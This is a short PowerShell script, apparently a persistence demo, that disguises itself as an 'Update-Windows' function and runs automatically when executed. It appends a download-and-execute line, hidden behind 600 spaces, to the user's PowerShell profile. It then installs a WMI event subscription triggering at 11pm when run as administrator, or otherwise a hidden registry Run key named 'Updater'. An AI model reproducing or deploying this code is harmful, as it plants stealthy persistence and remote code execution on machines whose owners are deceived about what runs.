# PowerShell script for playing around w/ persistence mechanisms

# Mattifestation method, persists by setting powershell script to %UserProfile%\Documents\WindowsPowerShell\profile.ps1 and launching powershell at boot (similar to bash.rc persistence method)
# If run as Administrator will persist using WMI consumer event which triggers at 11pm
# www.exploit-monday.com/2013/04/PersistenceWithPowerShell.html

function Update-Windows{
Param([Switch]$Persist)
$ErrorActionPreference='SilentlyContinue'
$Script={iex (iwr http://www.leeholmes.com/projects/ps_html5/Invoke-PSHtml5.ps1 )}
if($Persist){
if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
{$Payload="`$Filter=Set-WmiInstance -Class __EventFilter -Namespace `"root\subscription`" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage=`"WQL`";Query=`"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 23 AND TargetInstance.Minute = 00 GROUP WITHIN 60`"};`$Consumer=Set-WmiInstance -Namespace `"root\subscription`" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate=`"`$(`$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`";RunInteractively='false'};Set-WmiInstance -Namespace `"root\subscription`" -Class __FilterToConsumerBinding -Arguments @{Filter=`$Filter;Consumer=`$Consumer} | Out-Null"}
else
{$Payload='New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"'}
' '*600+$Script.ToString()|Out-File $PROFILE.CurrentUserAllHosts -Append -NoClobber -Force
iex $Payload|Out-Null
Write-Output $Payload}
else
{$Script.Invoke()}
} Update-Windows -Persist
